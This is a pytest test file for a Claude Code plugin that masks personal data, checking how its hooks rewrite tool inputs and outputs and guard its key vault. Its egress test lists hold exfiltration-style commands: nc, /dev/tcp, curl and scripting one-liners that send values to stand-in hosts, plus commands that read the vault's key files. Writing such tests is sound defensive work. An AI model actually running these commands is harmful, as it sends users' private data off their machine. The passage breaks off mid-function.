"""The hook protocol, driven the way Claude Code drives it: JSON on stdin, JSON on stdout."""
from __future__ import annotations

import json
import os
import re
import stat

import pytest
import shapes_recorded as recorded
from conftest import API_KEY, CARD, EMAIL, NOTES, PHONE, SENTINELS, SSN, assert_no_sentinel

MARKER = re.compile(r"\[\[[A-Z0-9_]+_[0-9A-Z]{6}\]\]")


def same_shape(a, b, path="$"):
    """Same keys in the same order, same types, same list lengths, at every depth."""
    assert type(a) is type(b), f"type differs at {path}"
    if isinstance(a, dict):
        assert list(a) == list(b), f"keys differ at {path}"
        for key in a:
            same_shape(a[key], b[key], f"{path}.{key}")
    elif isinstance(a, list):
        assert len(a) == len(b), f"length differs at {path}"
        for index, (x, y) in enumerate(zip(a, b)):
            same_shape(x, y, f"{path}[{index}]")


def updated(out):
    assert out["hookSpecificOutput"]["hookEventName"] == "PostToolUse"
    assert set(out["hookSpecificOutput"]) == {"hookEventName", "updatedToolOutput"}
    return out["hookSpecificOutput"]["updatedToolOutput"]


# -- PostToolUse: exact shapes ------------------------------------------------
@pytest.mark.parametrize("tool", [name for name in recorded.ALL if name != "Glob"])
def test_post_replaces_values_and_keeps_the_exact_shape(box, tool):
    tool_input, make = recorded.ALL[tool]
    response = make()
    out, result = box.post(tool, tool_input, response)
    assert result.returncode == 0 and result.stderr == b""
    new = updated(out)
    same_shape(response, new)
    assert_no_sentinel(json.dumps(new))
    assert MARKER.search(json.dumps(new))


def test_post_read_changes_only_content(box):
    response = recorded.read()
    new = updated(box.post("Read", {"file_path": "/project/notes.txt"}, response)[0])
    expected = json.loads(json.dumps(response))
    expected["file"]["content"] = new["file"]["content"]
    assert new == expected
    assert new["file"]["content"].count("\n") == NOTES.count("\n")
    assert len(MARKER.findall(new["file"]["content"])) == 5


def test_post_grep_changes_only_content(box):
    response = recorded.grep()
    new = updated(box.post("Grep", {"pattern": "synthetic"}, response)[0])
    assert {k: v for k, v in new.items() if k != "content"} == {k: v for k, v in response.items() if k != "content"}
    assert new["content"].startswith("2:1,Customer 01,[[EMAIL_")


def test_post_bash_changes_only_stdout_and_stderr(box):
    response = recorded.bash(stderr=f"warning: card {CARD}\n")
    new = updated(box.post("Bash", {"command": "cat config.env"}, response)[0])
    assert (new["interrupted"], new["isImage"], new["noOutputExpected"]) == (False, False, False)
    assert new["stdout"].startswith("# synthetic test data\nSUPPORT_EMAIL=[[EMAIL_")
    assert new["stderr"].startswith("warning: card [[CREDIT_CARD_")


def test_post_webfetch_keeps_url_and_numbers(box):
    response = recorded.webfetch()
    new = updated(box.post("WebFetch", {"url": "https://example.com", "prompt": "x"}, response)[0])
    assert {k: new[k] for k in ("url", "code", "codeText", "bytes", "durationMs")} == \
           {k: response[k] for k in ("url", "code", "codeText", "bytes", "durationMs")}


def test_post_write_keeps_path_type_and_null(box):
    response = recorded.write()
    new = updated(box.post("Write", {"file_path": "/project/out.txt", "content": EMAIL}, response)[0])
    assert new["type"] == "create" and new["filePath"] == "/project/out.txt"
    assert new["originalFile"] is None and new["structuredPatch"] == [] and new["userModified"] is False
    assert MARKER.fullmatch(new["content"])


def test_post_write_over_existing_file_covers_original_and_patch(box):
    response = {"type": "update", "filePath": "/project/out.txt", "content": f"new {EMAIL}\n",
                "originalFile": f"old {PHONE}\n",
                "structuredPatch": [{"oldStart": 1, "oldLines": 1, "newStart": 1, "newLines": 1,
                                     "lines": [f"-old {PHONE}", f"+new {EMAIL}"]}], "userModified": False}
    new = updated(box.post("Write", {"file_path": "/project/out.txt", "content": "x"}, response)[0])
    same_shape(response, new)
    assert_no_sentinel(json.dumps(new))
    assert new["structuredPatch"][0]["oldStart"] == 1


def test_post_mcp_list_shape(box):
    response = recorded.mcp()
    new = updated(box.post(recorded.MCP_TOOL, {"customer_id": "1"}, response)[0])
    assert isinstance(new, list) and new[0]["type"] == "text" and list(new[0]) == ["type", "text"]
    assert len(MARKER.findall(new[0]["text"])) == 3


def test_post_agent_keeps_every_other_field(box):
    response = recorded.agent()
    new = updated(box.post("Agent", recorded.ALL["Agent"][0], response)[0])
    for key in response:
        if key not in ("content", "prompt"):
            assert new[key] == response[key], key
    assert new["content"][0]["type"] == "text" and EMAIL not in new["content"][0]["text"]


def test_post_glob_and_clean_output_produce_no_output(box):
    out, result = box.post("Glob", {"pattern": "*.csv"}, recorded.glob())
    assert out is None and result.stdout == b"" and result.returncode == 0
    out, _ = box.post("Bash", {"command": "ls"}, recorded.bash(stdout="a.txt\nb.txt\n"))
    assert out is None


def test_post_unknown_tool_tokenizes_every_string_and_keeps_structure(box):
    response = {"note": EMAIL, "items": [{"label": f"call {PHONE}", "n": 3, "ok": True, "nothing": None},
                                         [f"ssn {SSN}", 1.5]], "nested": {"deep": {"key": API_KEY}}}
    new = updated(box.post("SomeFutureTool", {}, response)[0])
    same_shape(response, new)
    assert_no_sentinel(json.dumps(new))
    assert new["items"][0]["n"] == 3 and new["items"][1][1] == 1.5


def test_post_bash_with_extra_fields_from_newer_versions(box):
    response = dict(recorded.bash(), bashEditDiff=[{"file": "a.txt", "diff": f"+{EMAIL}"}])
    new = updated(box.post("Bash", {"command": "x"}, response)[0])
    same_shape(response, new)
    assert_no_sentinel(json.dumps(new))


def test_post_string_response(box):
    new = updated(box.post("SomeTool", {}, f"plain {EMAIL}")[0])
    assert isinstance(new, str) and EMAIL not in new


def test_post_image_read_is_left_alone(box):
    response = {"type": "image", "file": {"base64": "aGVsbG8=", "type": "image/png", "originalSize": 5}}
    out, _ = box.post("Read", {"file_path": "/project/a.png"}, response)
    assert out is None


def test_post_own_mcp_tool_is_not_touched(box):
    out, _ = box.post("mcp__plugin_datafog_guard__edit_with_markers", {}, [{"type": "text", "text": "Edited"}])
    assert out is None


# -- PreToolUse -----------------------------------------------------------------
def pre_updated(out):
    spec = out["hookSpecificOutput"]
    assert spec["hookEventName"] == "PreToolUse"
    return spec["updatedInput"]


def test_pre_read_redirects_to_an_owner_only_shadow_copy(box):
    path = box.write("notes.txt", NOTES)
    out, result = box.pre("Read", {"file_path": str(path), "offset": 2, "limit": 5})
    assert "permissionDecision" not in out["hookSpecificOutput"]
    new = pre_updated(out)
    assert set(new) == {"file_path", "offset", "limit"} and new["offset"] == 2 and new["limit"] == 5
    shadow = new["file_path"]
    assert shadow != str(path) and os.path.basename(shadow) == "notes.txt"
    assert shadow.startswith(str(box.data / "shadow"))
    content = open(shadow, encoding="utf-8").read()
    assert_no_sentinel(content)
    assert content.count("\n") == NOTES.count("\n") and len(MARKER.findall(content)) == 5
    assert stat.S_IMODE(os.stat(shadow).st_mode) == 0o600
    assert stat.S_IMODE(os.stat(os.path.dirname(shadow)).st_mode) == 0o700
    assert path.read_text() == NOTES, "the real file is never modified by a read"
    assert box.open_vault().restore(content).text == NOTES


def test_pre_read_of_a_clean_file_passes_untouched(box):
    path = box.write("clean.txt", "nothing personal here\n")
    out, result = box.pre("Read", {"file_path": str(path)})
    assert out is None and result.stdout == b"" and result.returncode == 0
    assert not (box.data / "shadow").exists()


def test_pre_read_hides_known_values_the_detector_misses(box):
    box.open_vault().tokenize("account number 000123456789")
    path = box.write("bare.txt", "ref 000123456789\n")
    new = pre_updated(box.pre("Read", {"file_path": str(path)})[0])
    assert "000123456789" not in open(new["file_path"]).read()


def test_pre_read_missing_file_and_directory_pass_through(box):
    assert box.pre("Read", {"file_path": str(box.project / "nope.txt")})[0] is None
    assert box.pre("Read", {"file_path": str(box.project)})[0] is None


@pytest.mark.parametrize("name,content,reason", [
    ("photo.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 20, "image or PDF"),
    ("doc.pdf", b"%PDF-1.7 " + EMAIL.encode(), "image or PDF"),
    ("blob.bin", b"abc\x00\x01\x02" + EMAIL.encode(), "binary"),
    ("latin1.txt", "caf\xe9 ".encode("latin-1") + EMAIL.encode(), "not UTF-8"),
])
def test_pre_read_unscannable_asks_by_default(box, name, content, reason):
    path = box.write(name, content)
    out, _ = box.pre("Read", {"file_path": str(path)})
    spec = out["hookSpecificOutput"]
    assert spec["permissionDecision"] == "ask" and reason in spec["permissionDecisionReason"]
    assert "updatedInput" not in spec
    assert_no_sentinel(json.dumps(out))


def test_pre_read_oversized_file_asks(box):
    path = box.write("big.txt", (f"{EMAIL}\n") * 200)
    out, _ = box.pre("Read", {"file_path": str(path)}, DATAFOG_MAX_SCAN_BYTES="2048")
    assert out["hookSpecificOutput"]["permissionDecision"] == "ask"
    assert "larger than" in out["hookSpecificOutput"]["permissionDecisionReason"]


@pytest.mark.parametrize("policy,expected", [("deny", "deny"), ("allow", None)])
def test_pre_read_unscannable_policy_is_configurable(box, policy, expected):
    path = box.write("photo.png", b"\x89PNG")
    out, _ = box.pre("Read", {"file_path": str(path)}, DATAFOG_UNSCANNABLE_POLICY=policy)
    assert (out["hookSpecificOutput"]["permissionDecision"] if out else None) == expected
    out, _ = box.pre("Read", {"file_path": str(path)}, CLAUDE_PLUGIN_OPTION_UNSCANNABLE_FILE_POLICY=policy)
    assert (out["hookSpecificOutput"]["permissionDecision"] if out else None) == expected


def test_pre_read_of_the_vault_is_denied(box):
    box.open_vault().tokenize(EMAIL)
    out, _ = box.pre("Read", {"file_path": str(box.vault / "workspace.enc")})
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_pre_write_restores_markers_in_content(box):
    marker = box.open_vault().tokenize(EMAIL)[0]
    out, _ = box.pre("Write", {"file_path": str(box.project / "out.txt"), "content": f"to: {marker}\n"})
    assert pre_updated(out) == {"file_path": str(box.project / "out.txt"), "content": f"to: {EMAIL}\n"}
    assert "permissionDecision" not in out["hookSpecificOutput"]


def test_pre_write_with_unknown_marker_still_writes_and_reports(box):
    marker = box.open_vault().tokenize(EMAIL)[0]
    content = f"{marker} and [[EMAIL_ZZZZZZ]]"
    out, _ = box.pre("Write", {"file_path": "/p/out.txt", "content": content})
    assert pre_updated(out)["content"] == f"{EMAIL} and [[EMAIL_ZZZZZZ]]"
    assert "1 marker-like" in out["hookSpecificOutput"]["additionalContext"]
    assert "permissionDecision" not in out["hookSpecificOutput"]


def test_pre_write_without_markers_is_untouched(box):
    assert box.pre("Write", {"file_path": "/p/out.txt", "content": "plain"})[0] is None


def test_pre_write_restore_can_be_limited_to_globs(box):
    marker = box.open_vault().tokenize(EMAIL)[0]
    out, _ = box.pre("Write", {"file_path": "/p/notes.md", "content": marker}, DATAFOG_RESTORE_ON_WRITE="*.env,*.csv")
    assert out is None
    out, _ = box.pre("Write", {"file_path": "/p/prod.env", "content": marker}, DATAFOG_RESTORE_ON_WRITE="*.env,*.csv")
    assert pre_updated(out)["content"] == EMAIL
    out, _ = box.pre("Write", {"file_path": "/p/prod.env", "content": marker}, DATAFOG_RESTORE_ON_WRITE="false")
    assert out is None


def test_pre_write_and_edit_to_a_shadow_path_go_to_the_real_file(box):
    path = box.write("notes.txt", NOTES)
    shadow = pre_updated(box.pre("Read", {"file_path": str(path)})[0])["file_path"]
    out, _ = box.pre("Write", {"file_path": shadow, "content": "x"})
    assert pre_updated(out) == {"file_path": str(path), "content": "x"}
    out, _ = box.pre("Edit", {"file_path": shadow, "old_string": "End of notes", "new_string": "The end"})
    assert pre_updated(out)["file_path"] == str(path)


def test_pre_edit_restores_new_string(box):
    marker = box.open_vault().tokenize(EMAIL)[0]
    tool_input = {"file_path": "/p/a.txt", "old_string": "TODO", "new_string": f"cc {marker}", "replace_all": False}
    assert pre_updated(box.pre("Edit", tool_input)[0]) == dict(tool_input, new_string=f"cc {EMAIL}")


def test_pre_grep_and_glob_restore_pattern_and_path(box):
    marker = box.open_vault().tokenize(EMAIL)[0]
    out, _ = box.pre("Grep", {"pattern": marker, "path": "/p", "output_mode": "content"})
    assert pre_updated(out) == {"pattern": EMAIL, "path": "/p", "output_mode": "content"}
    assert box.pre("Glob", {"pattern": "*.csv"})[0] is None


def test_pre_third_party_mcp_keeps_markers(box):
    marker = box.open_vault().tokenize(EMAIL)[0]
    out, result = box.pre("mcp__crm__send_message", {"to": marker, "body": "hi"})
    assert out is None and result.stdout == b""
    out, _ = box.pre("WebFetch", {"url": f"https://example.com/?q={marker}", "prompt": "x"})
    assert out is None
    out, _ = box.pre("Agent", {"prompt": f"email {marker}", "description": "x", "subagent_type": "general-purpose"})
    assert out is None


TICKET = re.compile(r" [0-9a-f]{64}$")


def decision(out):
    return out["hookSpecificOutput"].get("permissionDecision")


def test_pre_bash_wraps_and_keeps_other_fields(box):
    out, _ = box.pre("Bash", {"command": "cat notes.txt", "description": "Print", "timeout": 5000})
    new = pre_updated(out)
    assert set(new) == {"command", "description", "timeout"} and new["timeout"] == 5000
    assert new["command"].startswith(". ") and "__datafog_run" in new["command"]
    assert new["command"].endswith("'cat notes.txt'"), "no markers: no restore ticket"
    # no allow rule in the (empty) Claude Code settings of this test: the hook asks, as Claude Code would
    assert decision(out) == "ask" and "no Bash allow rule" in out["hookSpecificOutput"]["permissionDecisionReason"]
    box.claude_settings("user", {"allow": ["Bash(cat *)"]})
    out, _ = box.pre("Bash", {"command": "cat notes.txt"})
    assert decision(out) == "allow" and pre_updated(out)["command"].endswith("'cat notes.txt'")


def test_pre_bash_never_puts_a_real_value_in_its_output(box):
    """Late swap: the command handed back to Claude Code keeps the marker. Claude Code shows that
    command in the permission prompt and records it in the transcript and in permission_denials."""
    marker = box.open_vault().tokenize(EMAIL)[0]
    for setting in ("ask", "allow", "off"):
        out, result = box.pre("Bash", {"command": f"grep -c {marker} notes.txt"}, DATAFOG_RESTORE_IN_BASH=setting)
        command = pre_updated(out)["command"]
        assert f"grep -c {marker} notes.txt" in command
        assert_no_sentinel(json.dumps(out) + result.stdout.decode() + result.stderr.decode(), setting)
        assert bool(TICKET.search(command)) is (setting != "off"), "a ticket only when the runner may restore"
    assert_no_sentinel(box.visible_files(), "in the log")


def test_pre_bash_ticket_is_bound_to_the_command(box):
    from datafog_guard import bashwrap
    marker = box.open_vault().tokenize(EMAIL)[0]
    first = pre_updated(box.pre("Bash", {"command": f"grep -c {marker} a.txt"}, DATAFOG_RESTORE_IN_BASH="allow")[0])
    second = pre_updated(box.pre("Bash", {"command": f"grep -c {marker} b.txt"}, DATAFOG_RESTORE_IN_BASH="allow")[0])
    ticket_a, ticket_b = first["command"][-64:], second["command"][-64:]
    assert ticket_a != ticket_b
    assert bashwrap.ticket_is_valid(ticket_a, f"grep -c {marker} a.txt", str(box.vault))
    assert not bashwrap.ticket_is_valid(ticket_a, f"grep -c {marker} b.txt", str(box.vault))
    key = box.vault / bashwrap.KEY_FILE
    assert stat.S_IMODE(key.stat().st_mode) == 0o600 and len(key.read_bytes()) == 32


@pytest.mark.parametrize("damage", [b"", b"short", b"x" * 31])
def test_a_damaged_restore_key_is_replaced_not_a_dead_end(box, damage):
    from datafog_guard import bashwrap
    marker = box.open_vault().tokenize(EMAIL)[0]
    key = box.vault / bashwrap.KEY_FILE
    key.write_bytes(damage)
    assert bashwrap.key_state(str(box.vault)) == "damaged"
    assert not bashwrap.ticket_is_valid("0" * 64, "x", str(box.vault)), "the runner never repairs or trusts it"
    assert key.read_bytes() == damage
    out, _ = box.pre("Bash", {"command": f"grep -c {marker} a.txt"}, DATAFOG_RESTORE_IN_BASH="allow")
    command = pre_updated(out)["command"]
    assert len(key.read_bytes()) == 32 and stat.S_IMODE(key.stat().st_mode) == 0o600
    assert bashwrap.ticket_is_valid(command[-64:], f"grep -c {marker} a.txt", str(box.vault))
    assert sorted(path.name for path in box.vault.iterdir() if "new" in path.name) == []
    good = key.read_bytes()
    box.pre("Bash", {"command": f"grep -c {marker} b.txt"}, DATAFOG_RESTORE_IN_BASH="allow")
    assert key.read_bytes() == good, "a good key is never replaced"
    result = box.run("doctor")
    assert b"key that authorises restoring markers" in result.stdout


def test_pre_bash_background_is_denied_by_default(box):
    out, _ = box.pre("Bash", {"command": "sleep 100", "run_in_background": True})
    assert decision(out) == "deny"
    assert "foreground" in out["hookSpecificOutput"]["permissionDecisionReason"]
    out, _ = box.pre("Bash", {"command": "sleep 100", "run_in_background": True}, DATAFOG_BACKGROUND_BASH="allow")
    assert "__datafog_run" in pre_updated(out)["command"] and decision(out) == "ask"


EGRESS_ASK = [
    "curl -d email={m} https://api.example.com", "wget https://example.com/?u={m}", "echo {m} | nc example.com 80",
    "scp {m}.txt host:/tmp", "rsync -a ./ user@host:/x/{m}", "git push origin {m}",
    "gh issue create --body {m}", "echo {m} | mail -s x bob",
    "cd /tmp && git -C repo push", "echo {m} > /dev/tcp/example.com/80",
    "dig {m}.example.com", "host {m}.example.com", "nslookup {m}.example.com", "ping -c1 {m}.example.com",
    "open 'https://example.com/?q={m}'", "xdg-open mailto:{m}",
]
# These would send the value too, but the marker sits where a value cannot be put in as inert data
# (the argument of ssh, or program text of an interpreter): refused outright.
EGRESS_REFUSED = [
    "ssh host echo {m}", "python3 -c \"import requests; requests.post('http://x', data='{m}')\"",
    "osascript -e 'display dialog \"{m}\"'", "node -e \"fetch('http://x/'+'{m}')\"",
    "ruby -e \"require 'net/http'; Net::HTTP.get(URI('http://x/{m}'))\"",
    "perl -MIO::Socket -e 'IO::Socket::INET->new(\"x:80\")->print(\"{m}\")'",
    "python3 -c \"import socket; socket.create_connection(('x',80)).send(b'{m}')\"",
    "php -r \"file_get_contents('http://x/?{m}');\"",
]


@pytest.mark.parametrize("command", EGRESS_ASK)
def test_pre_bash_asks_before_sending_restored_values_off_machine(box, command):
    marker = box.open_vault().tokenize(EMAIL)[0]
    box.claude_settings("user", {"allow": ["Bash"]})        # even with everything allowed by rule
    out, _ = box.pre("Bash", {"command": command.format(m=marker) + f" # {marker}"}, DATAFOG_RESTORE_IN_BASH="allow")
    spec = out["hookSpecificOutput"]
    assert spec["permissionDecision"] == "ask" and "another machine" in spec["permissionDecisionReason"]
    assert "EMAIL" in spec["permissionDecisionReason"]
    assert_no_sentinel(json.dumps(out))
    assert TICKET.search(spec["updatedInput"]["command"]), "if the user approves, the runner restores"


@pytest.mark.parametrize("command", EGRESS_REFUSED)
def test_pre_bash_refuses_markers_where_a_second_parse_happens(box, command):
    marker = box.open_vault().tokenize(EMAIL)[0]
    box.claude_settings("user", {"allow": ["Bash"]})
    for setting in ("ask", "allow"):
        out, _ = box.pre("Bash", {"command": command.format(m=marker)}, DATAFOG_RESTORE_IN_BASH=setting)
        spec = out["hookSpecificOutput"]
        assert spec["permissionDecision"] == "deny" and "cannot be put in safely" in spec["permissionDecisionReason"]
        assert "1 EMAIL" in spec["permissionDecisionReason"] and "updatedInput" not in spec
        assert_no_sentinel(json.dumps(out))
        assert marker not in spec["permissionDecisionReason"]


def test_pre_bash_egress_heuristic_sees_what_the_value_would_add(box):
    """A value can itself be a URL: the heuristic runs on the restored text, inside the hook only."""
    marker = box.seed("https://user:pw@db.example.com/x", "CREDENTIAL_URI")
    box.claude_settings("user", {"allow": ["Bash(mytool *)"]})
    out, _ = box.pre("Bash", {"command": f"mytool {marker}"}, DATAFOG_RESTORE_IN_BASH="allow")
    assert decision(out) == "ask" and "another machine" in out["hookSpecificOutput"]["permissionDecisionReason"]
    assert "db.example.com" not in json.dumps(out)


def test_pre_bash_egress_without_markers_or_local_command_does_not_ask_about_egress(box):
    marker = box.open_vault().tokenize(EMAIL)[0]
    box.claude_settings("user", {"allow": ["Bash(curl *)", "Bash(grep *)"]})
    out, _ = box.pre("Bash", {"command": "curl https://example.com"})
    assert decision(out) == "allow"
    out, _ = box.pre("Bash", {"command": f"grep {marker} notes.txt"}, DATAFOG_RESTORE_IN_BASH="allow")
    assert decision(out) == "allow"
    out, _ = box.pre("Bash", {"command": f"curl -d {marker} https://example.com"}, DATAFOG_RESTORE_IN_BASH="allow",
                     DATAFOG_EGRESS_POLICY="deny")
    assert decision(out) == "deny"
    assert "updatedInput" not in out["hookSpecificOutput"]
    out, _ = box.pre("Bash", {"command": f"curl -d {marker} https://example.com"}, DATAFOG_RESTORE_IN_BASH="allow",
                     DATAFOG_EGRESS_POLICY="allow")
    assert decision(out) == "allow"
    out, _ = box.pre("Bash", {"command": f"curl -d {marker} https://example.com"}, DATAFOG_RESTORE_IN_BASH="off")
    assert decision(out) == "allow", "restore off: nothing real can leave, the user's rule decides"


# -- restore_in_bash: markers in a command are a way to compute on real values ---------------
ORACLES = ["echo {m} | base64", "printf %s {m} | wc -c", "echo {m} | rev", "echo {m} | xxd -p", "grep -c {m} notes.txt"]


@pytest.mark.parametrize("command", ORACLES)
def test_pre_bash_with_markers_asks_by_default(box, command):
    """Review finding: restoring into Bash is a value-recovery oracle. Default: the user decides.
    What the user is shown, and what Claude Code records, is the command with the marker."""
    marker = box.open_vault().tokenize(EMAIL)[0]
    box.claude_settings("user", {"allow": ["Bash"]})
    out, result = box.pre("Bash", {"command": command.format(m=marker)})
    spec = out["hookSpecificOutput"]
    assert spec["permissionDecision"] == "ask"
    reason = spec["permissionDecisionReason"]
    assert "1 EMAIL" in reason and EMAIL not in reason and marker not in reason
    assert command.format(m=marker) in spec["updatedInput"]["command"]
    assert_no_sentinel(json.dumps(out) + result.stderr.decode() + (box.data / "log" / "guard.log").read_text())


def test_pre_bash_without_markers_never_asks_about_markers(box):
    box.open_vault().tokenize(EMAIL)
    box.claude_settings("user", {"allow": ["Bash(ls *)", "Bash(echo *)"]})
    for command in ("ls -la", "echo [[0]] arr[[1]]", "echo [[EMAIL_ZZZZZZ]] x"):
        out, _ = box.pre("Bash", {"command": command})
        assert decision(out) == "allow", command
        assert not TICKET.search(pre_updated(out)["command"])
    assert "1 marker-like" in out["hookSpecificOutput"]["additionalContext"]


@pytest.mark.parametrize("command", ORACLES)
def test_pre_bash_restore_off_leaves_markers_and_says_so(box, command):
    marker = box.open_vault().tokenize(EMAIL)[0]
    out, _ = box.pre("Bash", {"command": command.format(m=marker)}, DATAFOG_RESTORE_IN_BASH="off")
    spec = out["hookSpecificOutput"]
    assert "markers" not in spec["permissionDecisionReason"]
    assert marker in spec["updatedInput"]["command"] and EMAIL not in json.dumps(out)
    assert not TICKET.search(spec["updatedInput"]["command"])
    assert "not restored in Bash commands" in spec["additionalContext"] and "1 EMAIL" in spec["additionalContext"]


def test_pre_bash_restore_allow_does_not_ask_about_markers(box):
    marker = box.open_vault().tokenize(EMAIL)[0]
    box.claude_settings("user", {"allow": ["Bash(grep *)"]})
    out, _ = box.pre("Bash", {"command": f"grep -c {marker} notes.txt"}, DATAFOG_RESTORE_IN_BASH="allow")
    spec = out["hookSpecificOutput"]
    assert spec["permissionDecision"] == "allow" and f"grep -c {marker} notes.txt" in spec["updatedInput"]["command"]
    assert TICKET.search(spec["updatedInput"]["command"])


def test_pre_bash_without_the_runner_nothing_is_restored_and_claude_code_decides(box):
    marker = box.open_vault().tokenize(EMAIL)[0]
    out, _ = box.pre("Bash", {"command": f"grep -c {marker} notes.txt"}, DATAFOG_BASH_WRAP="off",
                     DATAFOG_RESTORE_IN_BASH="allow")
    spec = out["hookSpecificOutput"]
    assert "updatedInput" not in spec and "permissionDecision" not in spec
    assert "bash_wrap is off" in spec["additionalContext"]
    out, _ = box.pre("Bash", {"command": "ls"}, DATAFOG_BASH_WRAP="off")
    assert out is None


def test_restore_in_bash_default_and_validation(box):
    from datafog_guard import config
    assert config.DEFAULT_RESTORE_IN_BASH == "ask" and config.RESTORE_IN_BASH == ("ask", "allow", "off")
    out, _ = box.pre("Bash", {"command": "ls"}, DATAFOG_RESTORE_IN_BASH="sometimes")
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny", "an invalid setting stops the engine"


def test_pre_bash_very_long_command_is_denied(box):
    out, _ = box.pre("Bash", {"command": "echo " + "x" * 120_000})
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_pre_bash_own_status_command_is_not_wrapped(box):
    launcher = os.path.join(os.environ.get("CLAUDE_PLUGIN_ROOT", ""), "x")
    from conftest import ROOT
    launcher = str(ROOT / "scripts" / "datafog-guard")
    for command in (f'sh "{launcher}" --data-dir "{box.data}" status', f"sh {launcher} doctor",
                    f'sh "{launcher}" --data-dir "{box.data}" purge --confirm DELETE-VAULT'):
        out, result = box.pre("Bash", {"command": command})
        assert out is None and result.returncode == 0, command
    out, _ = box.pre("Bash", {"command": f"sh {launcher} status; cat notes.txt"})
    assert "__datafog_run" in pre_updated(out)["command"], "anything more than the bare command is wrapped"


def test_pre_calls_that_reach_into_the_vault_are_denied(box):
    box.open_vault().tokenize(EMAIL)
    for tool, tool_input in [("Bash", {"command": f"cat {box.vault}/*"}),
                             ("Bash", {"command": f"strings '{box.vault}/workspace.key' | head"}),
                             ("Read", {"file_path": str(box.vault / "workspace.key")}),
                             ("Read", {"file_path": str(box.vault / "markers.index")}),
                             ("Read", {"file_path": str(box.vault / "bash-restore.key")}),
                             ("Grep", {"pattern": "example", "path": str(box.vault)}),
                             ("Grep", {"pattern": "example", "path": str(box.tmp)}),
                             ("Glob", {"pattern": "**/*", "path": str(box.vault)}),
                             ("Write", {"file_path": str(box.vault / "workspace.enc"), "content": "x"}),
                             ("Edit", {"file_path": str(box.vault / "markers.index"), "old_string": "a", "new_string": "b"})]:
        out, _ = box.pre(tool, tool_input)
        assert out["hookSpecificOutput"]["permissionDecision"] == "deny", (tool, tool_input)
    out, _ = box.pre("Grep", {"pattern": "example", "path": str(box.project)})
    assert out is None


def test_pre_powershell_is_denied(box):
    out, _ = box.pre("PowerShell", {"command": "Get-Content notes.txt"})
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_pre_other_tools_pass(box):
    out, result = box.pre("TodoWrite", {"todos": []})
    assert out is None and result.returncode == 0


# -- UserPromptSubmit -----------------------------------------------------------
def test_prompt_with_values_is_blocked_with_a_tokenized_version(box):
    out, result = box.prompt(f"email {EMAIL} about card {CARD}")
    assert out["decision"] == "block"
    assert out["hookSpecificOutput"] == {"hookEventName": "UserPromptSubmit", "suppressOriginalPrompt": True}
    assert_no_sentinel(json.dumps(out) + result.stderr.decode())
    assert "1 CREDIT_CARD, 1 EMAIL" in out["reason"]
    tokenized = out["reason"].split("\n\n", 1)[1]
    assert box.open_vault().restore(tokenized).text == f"email {EMAIL} about card {CARD}", \
        "the markers were committed to the vault before they were shown"
    assert box.prompt(tokenized)[0] is None, "the tokenized prompt goes through"


def test_clean_prompt_passes(box):
    out, result = box.prompt("refactor the parser please")
    assert out is None and result.stdout == b"" and result.returncode == 0


def test_prompt_with_file_mention_holding_values_is_blocked(box):
    box.write("notes.txt", NOTES)
    out, result = box.prompt("summarise @notes.txt please")
    assert out["decision"] == "block" and out["hookSpecificOutput"]["suppressOriginalPrompt"] is True
    assert "@notes.txt" in out["reason"] and "read the file" in out["reason"]
    assert_no_sentinel(json.dumps(out))
    assert not box.vault.exists() or not box.open_vault().entry_counts(), "checking a mention stores nothing"


@pytest.mark.parametrize("prompt", [
    'look at @"my notes.txt"', "look at @'my notes.txt' now", "look at @my\\ notes.txt now", "see @sub/notes.txt.",
    "@notes.txt#L2-4 explain", "@notes.txt:2-4 explain", "@notes.txt:7", "(see @notes.txt)", "what is in @~/notes.txt?",
    "compare @clean.txt with @notes.txt", "all of @sub/*.txt please", "@**/notes.txt", "@./sub/../notes.txt",
])
def test_prompt_mention_forms(box, prompt):
    (box.project / "sub").mkdir()
    for name in ("my notes.txt", "sub/notes.txt", "notes.txt"):
        box.write(name, NOTES)
    box.write("clean.txt", "hello\n")
    out, _ = box.prompt(prompt, HOME=str(box.project))
    assert out and out["decision"] == "block", prompt
    assert_no_sentinel(json.dumps(out))


# -- @directory mentions ---------------------------------------------------------------------
def test_prompt_mentioning_a_directory_with_values_is_blocked(box):
    (box.project / "data" / "deep").mkdir(parents=True)
    box.write("data/readme.md", "nothing here\n")
    box.write("data/deep/customers.csv", f"id,email\n1,{EMAIL}\n2,{PHONE}\n")
    for prompt in ("summarise @data", "summarise @data/ please", "summarise @./data/deep/"):
        out, _ = box.prompt(prompt)
        assert out and out["decision"] == "block", prompt
        assert "contains 1 EMAIL, 1 PHONE" in out["reason"] and EMAIL not in json.dumps(out)


def test_prompt_mentioning_a_clean_directory_passes(box):
    (box.project / "docs").mkdir()
    box.write("docs/a.md", "alpha\n")
    box.write("docs/b.md", "beta\n")
    assert box.prompt("summarise @docs/")[0] is None


def test_prompt_mentioning_a_directory_with_an_unscannable_file_is_blocked(box):
    (box.project / "assets").mkdir()
    box.write("assets/a.md", "alpha\n")
    box.write("assets/scan.pdf", b"%PDF-1.7")
    out, _ = box.prompt("describe @assets")
    assert out["decision"] == "block" and "1 file(s) in it cannot be checked" in out["reason"]
    assert box.prompt("describe @assets", DATAFOG_UNSCANNABLE_POLICY="allow")[0] is None


@pytest.mark.parametrize("kind,needle", [("many", "more than 200 files"), ("deep", "more than 4 levels"),
                                         ("big", "more than 8 MiB")])
def test_prompt_mentioning_a_directory_beyond_the_bounds_is_blocked_with_the_reason(box, kind, needle):
    root = box.project / "big"
    root.mkdir()
    if kind == "many":
        for number in range(205):
            (root / f"f{number}.txt").write_text("x\n")
    elif kind == "deep":
        (root / "a/b/c/d/e/f").mkdir(parents=True)
        (root / "a/b/c/d/e/f/x.txt").write_text("x\n")
    else:
        for number in range(3):
            (root / f"f{number}.txt").write_text("x" * (3 * 1024 * 1024))
    out, _ = box.prompt("look through @big")
    assert out["decision"] == "block" and needle in out["reason"]


def test_prompt_mention_directory_skips_vcs_and_dependency_folders(box):
    for name in (".git", "node_modules"):
        (box.project / "repo" / name).mkdir(parents=True)
        box.write(f"repo/{name}/x.txt", NOTES)
    box.write("repo/main.py", "print('hi')\n")
    assert box.prompt("review @repo")[0] is None


def test_prompt_with_clean_or_missing_mentions_passes(box):
    box.write("clean.txt", "hello\n")
    assert box.prompt("see @clean.txt and @missing.txt and mail me@")[0] is None


def test_prompt_with_unscannable_mention_is_blocked(box):
